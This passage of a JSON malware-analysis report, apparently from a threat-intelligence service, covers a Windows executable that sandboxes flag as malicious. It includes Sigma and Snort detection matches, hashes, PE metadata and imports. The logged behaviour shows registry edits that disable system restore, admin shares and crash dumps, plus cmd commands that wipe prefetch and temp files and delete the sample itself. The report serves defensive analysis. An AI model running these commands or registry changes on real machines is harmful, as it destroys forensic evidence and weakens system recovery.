                "TargetObject": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR"
              }
            }
          ],
          "rule_level": "high",
          "rule_description": "Detects the modification of the registry to disable a system restore on the computer",
          "rule_author": "frack113",
          "rule_id": "39ac4b0484423463b1d746fc5446062ea1299bec08a2dd2bc058efcd9c06f2e0"
        },
        {
          "rule_title": "Internet Explorer Autorun Keys Modification",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "http://www.%%s.com",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Internet Explorer\\Toolbar\\QuickComplete\\QuickComplete"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
          "rule_id": "11ecb99add36c59a082a478e7c117545e6404a0b28c77c007c135739df91a489"
        },
        {
          "rule_title": "Wow6432Node CurrentVersion Autorun Keys Modification",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Users\\george\\Desktop\\program.exe",
                "Details": "XunleiBHO",
                "RuleName": "T1176",
                "TargetObject": "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\\{889D2FEB-5411-4565-8998-1DD2C5261283}\\(Default)"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
          "rule_id": "18842e32896dd83b8aca4d5e1ac78c1f66b1d252479c0023cdd02f108c42c8cd"
        },
        {
          "rule_title": "Disable Administrative Share Creation at Startup",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\AutoShareServer"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\AutoShareWks"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Administrative shares are hidden network shares created by Microsoft Windows NT operating systems that grant system administrators remote access to every disk volume on a network-connected system",
          "rule_author": "frack113",
          "rule_id": "529a42d20f26a0247c669d877e7a0260adfafaaf2627c9f33ad4d8b571e8d20a"
        },
        {
          "rule_title": "Potential Persistence Via COM Search Order Hijacking",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "(Empty)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKCR\\WOW6432Node\\CLSID\\{FB7199AB-79BF-11d2-8D94-0000F875C541}\\InProcServer32\\(Default)"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects potential COM object hijacking leveraging the COM Search Order",
          "rule_author": "Maxime Thiebaut (@0xThiebaut), oscd.community, Cédric Hien",
          "rule_id": "7f5d257abc981b5eddb52d4a9a02fb66201226935cf3d39177c8a81c3a3e8dd4"
        },
        {
          "rule_title": "Removal of Potential COM Hijacking Registry Keys",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "12",
                "EventType": "DeleteKey",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "TargetObject": "HKCR\\CompressedFolder\\shell\\Open\\Command",
                "RuleName": "Suspicious,ImageBeginWithBackslash"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects any deletion of entries in \".*\\shell\\open\\command\" registry keys.\nThese registry keys might have been used for COM hijacking activities by a threat actor or an attacker and the deletion could indicate steps to remove its tracks.\n",
          "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
          "rule_id": "85b8f7bd2db84db2632bf9e5b9b9402e829785f546868fe1a62c7a6002a6eb60"
        },
        {
          "rule_title": "Imports Registry Key From a File",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Windows\\SysWOW64\\cmd.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c regedit /s \"C:\\Users\\george\\AppData\\Local\\Temp\\XTYH.reg\"",
                "CommandLine": "regedit  /s \"C:\\Users\\george\\AppData\\Local\\Temp\\XTYH.reg\"",
                "RuleName": "-",
                "Hashes": "MD5=617538C965AC4DDC72F9CF647C4343D5,SHA256=98D7A11237F9106F7C4F71A3203596BD526C7388DD95CF90F025603DA519C83D,IMPHASH=5EADFA1DAF16BA4D74C085F91F544D0E",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "OriginalFileName": "REGEDIT.EXE",
                "Description": "Registry Editor"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects the import of the specified file to the registry with regedit.exe.",
          "rule_author": "Oddvar Moe, Sander Wiebing, oscd.community",
          "rule_id": "d17374b215c7dec3cfb7a7588c3e1ba10e710be57c03928275fcfd3c65bd187b"
        },
        {
          "rule_title": "CrashControl CrashDump Disabled",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\LogEvent"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\SendAlert"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\AutoReboot"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Image": "C:\\Windows\\SysWOW64\\regedit.exe",
                "Details": "DWORD (0x00000000)",
                "RuleName": "Suspicious,ImageBeginWithBackslash",
                "TargetObject": "HKLM\\System\\CurrentControlSet\\Control\\CrashControl\\CrashDumpEnabled"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects disabling the CrashDump per registry (as used by HermeticWiper)",
          "rule_author": "Tobias Michalski (Nextron Systems)",
          "rule_id": "de530c1426a408ae40cc5a51e752587348efab456b3dcc12204b8c47a389eb83"
        },
        {
          "rule_title": "File Deletion Via Del",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\Desktop\\program.exe",
                "Description": "Windows Command Processor",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Company": "Microsoft Corporation",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\program.exe\"",
                "CommandLine": "C:\\Windows\\system32\\cmd.exe /c del /f /s /q %%windir%%\\prefetch\\*.*",
                "RuleName": "-",
                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                "OriginalFileName": "Cmd.Exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "ParentImage": "C:\\Users\\george\\Desktop\\program.exe",
                "Description": "Windows Command Processor",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\program.exe\"",
                "CommandLine": "C:\\Windows\\system32\\cmd.exe /c del /f /s /q %%userprofile%%\\Local Settings\\Temp\\*.*",
                "RuleName": "-",
                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                "Company": "Microsoft Corporation",
                "OriginalFileName": "Cmd.Exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)"
              }
            },
            {
              "values": {
                "EventID": "1",
                "Product": "Microsoft\\xae Windows\\xae Operating System",
                "Company": "Microsoft Corporation",
                "ParentImage": "C:\\Users\\george\\Desktop\\program.exe",
                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
                "IntegrityLevel": "High",
                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\program.exe\"",
                "RuleName": "-",
                "Hashes": "MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726",
                "CommandLine": "C:\\Windows\\system32\\cmd.exe /c ping 127.0.0.1 -n 2&del /q \"C:\\Users\\george\\Desktop\\program.exe\"",
                "OriginalFileName": "Cmd.Exe",
                "Description": "Windows Command Processor"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n",
          "rule_author": "frack113",
          "rule_id": "77ed185ff979a8d9206b5eed07bf6d5823529f713ed0ea19f2ef7a4a355568bc"
        }
      ],
      "meaningful_name": "c4286d55d655b52e9616a6d6d3a388f76a796592.bin",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 0,
        "medium": 2,
        "low": 3
      },
      "trid": [
        {
          "file_type": "Windows Control Panel Item (generic)",
          "probability": 85.7
        },
        {
          "file_type": "Win64 Executable (generic)",
          "probability": 4.5
        },
        {
          "file_type": "Win32 Dynamic Link Library (generic)",
          "probability": 2.8
        },
        {
          "file_type": "Win16 NE executable (generic)",
          "probability": 2.1
        },
        {
          "file_type": "Win32 Executable (generic)",
          "probability": 1.9
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 1,
          "medium": 7,
          "critical": 0,
          "low": 1
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 84,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "PHISHING",
            "TROJAN",
            "EVADER"
          ]
        },
        "C2AE": {
          "category": "undetected",
          "sandbox_name": "C2AE",
          "malware_classification": [
            "UNKNOWN_VERDICT"
          ]
        },
        "SecondWrite": {
          "category": "malicious",
          "sandbox_name": "SecondWrite",
          "malware_classification": [
            "MALWARE",
            "RANSOM",
            "BANKER",
            "RAT",
            "ADWARE"
          ]
        }
      },
      "sha256": "08c2d3fec8cd9fcced634df7ad0f3db164ffe0cbfc263e2d8be026afca05bfcb",
      "type_extension": "exe",
      "tags": [
        "peexe",
        "runtime-modules",
        "detect-debug-environment",
        "calls-wmi",
        "direct-cpu-clock-access",
        "long-sleeps",
        "persistence"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "successful-recon-limited",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP Unusual PING detected",
          "rule_raw": "alert icmp $HOME_NET any -> $EXTERNAL_NET any ( msg:\"PROTOCOL-ICMP Unusual PING detected\"; icode:0; itype:8; fragbits:!M; content:!\"ABCDEFGHIJKLMNOPQRSTUVWABCDEFGHI\",depth 32; content:!\"0123456789abcdefghijklmnopqrstuv\",depth 32; content:!\"EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE\",depth 36; content:!\"WANG2\"; content:!\"cacti-monitoring-system\",depth 65; content:!\"SolarWinds\",depth 72; metadata:policy max-detect-ips drop,ruleset community; reference:url,krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/; reference:url,krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/; classtype:successful-recon-limited; sid:29456; rev:3; )",
          "rule_references": [
            "https://krebsonsecurity.com/2014/01/a-closer-look-at-the-target-malware-part-ii/",
            "https://krebsonsecurity.com/2014/01/a-first-look-at-the-target-intrusion-malware/"
          ],
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:29456"
        },
        {
          "rule_category": "attempted-recon",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "medium",
          "rule_msg": "PROTOCOL-ICMP traceroute",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP traceroute\"; itype:8; ttl:1; metadata:ruleset community; classtype:attempted-recon; sid:385; rev:8; )",
          "rule_id": "1:385"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "(eth) truncated ethernet header",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert ( gid:116; sid:424; rev:2; msg:\"(eth) truncated ethernet header\"; metadata: policy max-detect-ips drop, rule-type decode; classtype:misc-activity;)",
          "rule_id": "116:424"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_source": "Snort registered user ruleset",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_id": "1:408"
        }
      ],
      "last_analysis_date": 1687804960,
      "unique_sources": 4,
      "first_submission_date": 1676650514,
      "sha1": "c4286d55d655b52e9616a6d6d3a388f76a796592",
      "ssdeep": "24576:G4lavt0LkLL9IMixoEgeaasEqqTIwq9MmCS:Rkwkn9IMHeaaqCaPCS",
      "md5": "273273f5fd6f0fc5787216d8fb92e5b5",
      "pe_info": {
        "resource_details": [
          {
            "lang": "ENGLISH UK",
            "entropy": 2.254985809326172,
            "chi2": 39565.58,
            "filetype": "unknown",
            "sha256": "245fc49e4e955e1db3975b826dcf27ad2eb32a6831caa4cb6b501a3914bcfaa9",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.4855167865753174,
            "chi2": 96805.16,
            "filetype": "unknown",
            "sha256": "7a7d20ee193037231a6f52eedacf31745c2c71ba17b4d622eb1a066bd270692c",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.857604742050171,
            "chi2": 36331.93,
            "filetype": "unknown",
            "sha256": "9224815d59d11a7171c81fb500265b03cc532f717cf08e25ba448b4d80d58dd3",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.8107337951660156,
            "chi2": 25597.77,
            "filetype": "unknown",
            "sha256": "6865d74f31442a6d2e8a2bc30a045f9fefc64ecb51a217b85c00c71e690dd28a",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.3772995471954346,
            "chi2": 20600.86,
            "filetype": "unknown",
            "sha256": "a387f58a334759e4c6fecf5d6663c9e89f973e8060e3aa7ade6ac61fd8c855ad",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.294097900390625,
            "chi2": 173550.81,
            "filetype": "unknown",
            "sha256": "9b938c2322304dd549786e8ac52ef81408490c173ef66fb606066d7229b5736d",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.838462829589844,
            "chi2": 75608.56,
            "filetype": "unknown",
            "sha256": "f46ef0e77f431c593ee20eb91d147abdfba7d835a742efc248d55f51b948e1b2",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.946890354156494,
            "chi2": 53215.03,
            "filetype": "unknown",
            "sha256": "716d867dbf77bb452ec574620e49a5d7bd1ea1514ed9437267813de70342d5c3",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 4.216457366943359,
            "chi2": 114304.28,
            "filetype": "unknown",
            "sha256": "e51479fc7ef910bb84e891366301e07171e868e95c15b7a6f33858bfc2c1d6a2",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.289796829223633,
            "chi2": 380651.16,
            "filetype": "unknown",
            "sha256": "be4881e77745150b65955852e46e47b1100b519f7aecaeb4b8941c0f103d9b7c",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.599703311920166,
            "chi2": 139944.45,
            "filetype": "unknown",
            "sha256": "8e63396486b1efd09056dcf53d0dc4da41b5edcd42ca2496ea5b92d6cec797f4",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.7104692459106445,
            "chi2": 74632.08,
            "filetype": "unknown",
            "sha256": "4c8421378249092f37b4f2bd12b28f253a3b04bf52d22d87c7de892bc9d07b17",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.665196895599365,
            "chi2": 35136.87,
            "filetype": "unknown",
            "sha256": "89eab3f2c0f93eddeac97c75f5f63df3b809e04f102fee9949dcac887093691f",
            "type": "RT_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.3470208644866943,
            "chi2": 95826.95,
            "filetype": "unknown",
            "sha256": "4fe35e21717d34ceb4717f9e9de8fde1b3de80d76a59bb87405910c2f1d6284b",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.28170108795166,
            "chi2": 111751.78,
            "filetype": "unknown",
            "sha256": "9306910d4bb273465765832df77fb1fd78bd6e0bcbf9908636e323c34c92b613",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.288486957550049,
            "chi2": 78471.64,
            "filetype": "unknown",
            "sha256": "e47fa3aec12353f6370b941bc5855e5551530c7b26f925b5a2e2692a0201450c",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.2837283611297607,
            "chi2": 102749.57,
            "filetype": "unknown",
            "sha256": "4854e5abce2237256df24b69c9759fc1e8caa423a54bfe661ba7031afd8375eb",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.2632203102111816,
            "chi2": 109138.88,
            "filetype": "unknown",
            "sha256": "d38369002e36f73866a0d40b13e069b9ffdbda50957f4c88d52a72fecb9b4e45",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.2581164836883545,
            "chi2": 76171.01,
            "filetype": "unknown",
            "sha256": "58ea125e6b5fa2cbc5a8ed819c7f50c9bca1cfe55f94c7cff3feb60f25ac6073",
            "type": "RT_STRING"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.0857229232788086,
            "chi2": 25705.48,
            "filetype": "unknown",
            "sha256": "b3711acbe8e01fee7fd362112b4e42da05c728e98b85c0a3b4cb075977849cee",
            "type": "RT_STRING"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 7.989538669586182,
            "chi2": 268.39,
            "filetype": "unknown",
            "sha256": "81688cef2a44c9d9dca4053e926fae67a342d2a80ae4c83e88f620109993668a",
            "type": "RT_RCDATA"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 3.095932722091675,
            "chi2": 11169.45,
            "filetype": "ICO",
            "sha256": "3b5f7fcb0cb753a11c522bf9cd288746536d77a9f5a25995d86ea12384d3d694",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 1.8427376747131348,
            "chi2": 1720.8,
            "filetype": "ICO",
            "sha256": "ae172a9a2fd008910b537c92a95b38bfba0e5bbdaaca719bf686e6415a7a2ba1",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "CHINESE SIMPLIFIED",
            "entropy": 3.374070882797241,
            "chi2": 47486.22,
            "filetype": "unknown",
            "sha256": "ce381a2b298767cceb411a97f8f289bf7095b8577c603c8a6f162f7ff6580038",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH UK",
            "entropy": 5.374451637268066,
            "chi2": 6303.34,
            "filetype": "unknown",
            "sha256": "71cd1217f8aa6f2f9b032f3e94a1a0e16ac9142001a2df8bce15994fef025a08",
            "type": "RT_MANIFEST"
          }
        ],
        "rich_pe_header_hash": "00404645cf6c33a8983bc6d770a8831b",
        "imphash": "bbac62fd99326ea68ec5a33b36925dd1",
        "compiler_product_versions": [
          "id: 199, version: 41118 count=1",
          "id: 205, version: 50929 count=51",
          "id: 206, version: 50929 count=177",
          "id: 207, version: 50929 count=50",
          "[ C ] VS2008 SP1 build 30729 count=9",
          "[IMP] VS2008 SP1 build 30729 count=37",
          "[---] Unmarked objects count=530",
          "id: 216, version: 61030 count=77",
          "[ASM] VS2012 UPD4 build 61030 count=2",
          "[RES] VS2012 UPD4 build 61030 count=1",
          "id: 151, version: 0 count=1",
          "[LNK] VS2012 UPD4 build 61030 count=1"
        ],
        "resource_langs": {
          "NEUTRAL": 1,
          "ENGLISH UK": 23,
          "CHINESE SIMPLIFIED": 1
        },
        "machine_type": 332,
        "timestamp": 1458807380,
        "resource_types": {
          "RT_MANIFEST": 1,
          "RT_STRING": 7,
          "RT_RCDATA": 1,
          "RT_ICON": 13,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 2
        },
        "sections": [
          {
            "name": ".text",
            "chi2": 3037511,
            "virtual_address": 4096,
            "entropy": 6.68,
            "raw_size": 573440,
            "flags": "rx",
            "virtual_size": 573044,
            "md5": "74af66fa540568c59b3868e78900e476"
          },
          {
            "name": ".rdata",
            "chi2": 4578525.5,
            "virtual_address": 577536,
            "entropy": 5.78,
            "raw_size": 182272,
            "flags": "r",
            "virtual_size": 182122,
            "md5": "576c856afaad699ad9fe099fc6a9ce33"
          },
          {
            "name": ".data",
            "chi2": 4278598.5,
            "virtual_address": 761856,
            "entropy": 2,
            "raw_size": 25088,
            "flags": "rw",
            "virtual_size": 40756,
            "md5": "e6d2e204147f7cdc3055011093632f54"
          },
          {
            "name": ".rsrc",
            "chi2": 1319800.25,
            "virtual_address": 802816,
            "entropy": 6.33,
            "raw_size": 60416,
            "flags": "r",
            "virtual_size": 60136,
            "md5": "5da85a3697415c0dcb6e42eb4997da99"
          },
          {
            "name": ".reloc",
            "chi2": 1539184,
            "virtual_address": 864256,
            "entropy": 5.24,
            "raw_size": 42496,
            "flags": "r",
            "virtual_size": 42082,
            "md5": "c2f6ddaeef894b7510c3be928eeae5dd"
          }
        ],
        "import_list": [
          {
            "library_name": "MPR.dll",
            "imported_functions": [
              "WNetAddConnection2W",
              "WNetCancelConnection2W",
              "WNetGetConnectionW",
              "WNetUseConnectionW"
            ]
          },
          {
            "library_name": "COMDLG32.dll",
            "imported_functions": [
              "GetOpenFileNameW",
              "GetSaveFileNameW"
            ]
          },
          {
            "library_name": "IPHLPAPI.DLL",
            "imported_functions": [
              "IcmpCloseHandle",
              "IcmpCreateFile",
              "IcmpSendEcho"
            ]
          },
          {
            "library_name": "KERNEL32.dll",
            "imported_functions": [
              "Beep",
              "CloseHandle",
              "CompareStringW",
              "CopyFileW",
              "CreateDirectoryW",
              "CreateEventW",
              "CreateFileW",
              "CreateHardLinkW",
              "CreatePipe",
              "CreateProcessW",
              "CreateThread",
              "CreateToolhelp32Snapshot",
              "DeleteCriticalSection",
              "DeleteFileW",
              "DeviceIoControl",
              "DuplicateHandle",
              "EnterCriticalSection",
              "EnumResourceNamesW",
              "ExitProcess",
              "ExitThread",
              "FileTimeToLocalFileTime",
              "FileTimeToSystemTime",
              "FindClose",
              "FindFirstFileW",
              "FindNextFileW",
              "FindResourceExW",
              "FindResourceW",
              "FlushFileBuffers",
              "FormatMessageW",
              "FreeEnvironmentStringsW",
              "FreeLibrary",
              "GetACP",
              "GetCommandLineW",
              "GetComputerNameW",
              "GetConsoleCP",
              "GetConsoleMode",
              "GetCPInfo",
              "GetCurrentDirectoryW",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThread",
              "GetCurrentThreadId",
              "GetDateFormatW",
              "GetDiskFreeSpaceExW",
              "GetDiskFreeSpaceW",
              "GetDriveTypeW",
              "GetEnvironmentStringsW",
              "GetEnvironmentVariableW",
              "GetExitCodeProcess",
              "GetFileAttributesW",
              "GetFileSize",
              "GetFileType",
              "GetFullPathNameW",
              "GetLastError",
              "GetLocalTime",
              "GetModuleFileNameW",
              "GetModuleHandleExW",
              "GetModuleHandleW",
              "GetOEMCP",
              "GetPrivateProfileSectionNamesW",
              "GetPrivateProfileSectionW",
              "GetPrivateProfileStringW",
              "GetProcAddress",
              "GetProcessHeap",
              "GetProcessIoCounters",
              "GetShortPathNameW",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeW",
              "GetSystemDirectoryW",
              "GetSystemInfo",
              "GetSystemTimeAsFileTime",
              "GetTempFileNameW",
              "GetTempPathW",
              "GetTimeFormatW",
              "GetTimeZoneInformation",
              "GetVersionExW",
              "GetVolumeInformationW",
              "GetWindowsDirectoryW",
              "GlobalAlloc",
              "GlobalFree",
              "GlobalLock",
              "GlobalMemoryStatusEx",
              "GlobalUnlock",
              "HeapAlloc",
              "HeapFree",
              "HeapReAlloc",
              "HeapSize",
              "InitializeCriticalSectionAndSpinCount",
              "InterlockedDecrement",
              "InterlockedExchange",
              "InterlockedIncrement",
              "IsDebuggerPresent",
              "IsProcessorFeaturePresent",
              "IsValidCodePage",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryA",
              "LoadLibraryExW",
              "LoadLibraryW",
              "LoadResource",
              "LocalFileTimeToFileTime",
              "LockResource",
              "lstrcmpiW",
              "lstrcpyW",
              "lstrlenW",
              "MoveFileW",
              "MulDiv",
              "MultiByteToWideChar",
              "OpenProcess",
              "OutputDebugStringW",
              "Process32FirstW",
              "Process32NextW",
              "QueryPerformanceCounter",
              "QueryPerformanceFrequency",
              "RaiseException",
              "ReadConsoleW",
              "ReadFile",
              "ReadProcessMemory",
              "RemoveDirectoryW",
              "ResumeThread",
              "RtlUnwind",
              "SetCurrentDirectoryW",
              "SetEndOfFile",
              "SetEnvironmentVariableA",
              "SetEnvironmentVariableW",
              "SetErrorMode",
              "SetEvent",
              "SetFileAttributesW",
              "SetFilePointer",
              "SetFilePointerEx",
              "SetFileTime",
              "SetLastError",
              "SetPriorityClass",
              "SetStdHandle",
              "SetSystemPowerState",
              "SetUnhandledExceptionFilter",
              "SetVolumeLabelW",
              "SizeofResource",
              "Sleep",
              "SystemTimeToFileTime",
              "TerminateProcess",
              "TerminateThread",
              "TlsAlloc",
              "TlsFree",
              "TlsGetValue",
              "TlsSetValue",
              "UnhandledExceptionFilter",
              "VirtualAlloc",
              "VirtualAllocEx",
              "VirtualFree",
              "VirtualFreeEx",
              "WaitForSingleObject",
              "WideCharToMultiByte",
              "WriteConsoleW",
              "WriteFile",
              "WritePrivateProfileSectionW",
              "WritePrivateProfileStringW",
              "WriteProcessMemory"
            ]
          },
          {
            "library_name": "UxTheme.dll",
            "imported_functions": [
              "IsThemeActive"
            ]
          },
          {
            "library_name": "OLEAUT32.dll",
            "imported_functions": [
              "CreateDispTypeInfo",
              "CreateStdDispatch",
              "DispCallFunc",
              "LoadTypeLibEx",
